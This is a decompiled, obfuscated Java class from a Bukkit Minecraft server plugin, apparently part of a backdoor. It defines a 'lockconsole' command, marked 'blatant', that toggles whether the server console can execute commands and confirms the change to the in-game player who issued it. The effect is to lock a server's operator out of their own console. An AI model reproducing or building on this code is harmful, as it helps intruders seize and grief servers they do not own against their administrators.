/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class LockconsoleCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    public LockconsoleCommand() {
        LockconsoleCommand lllllllllllllIIllIlllIllIlIlIllI;
    }

    @Override
    public void execute(Core lllllllllllllIIllIlllIllIlIIlllI, String lllllllllllllIIllIlllIllIlIlIIIl, String[] lllllllllllllIIllIlllIllIlIlIIII, Player lllllllllllllIIllIlllIllIlIIllll) {
        if (lllllllllllllIIllIlllIllIlIIlllI.isLocked) {
            lllllllllllllIIllIlllIllIlIIlllI.isLocked = false;
            lllllllllllllIIllIlllIllIlIIllll.sendMessage(Settings.PREFIX("Console can now execute commands."));
        } else {
            lllllllllllllIIllIlllIllIlIIlllI.isLocked = true;
            lllllllllllllIIllIlllIllIlIIllll.sendMessage(Settings.PREFIX("Console can no longer execute commands."));
        }
    }
}

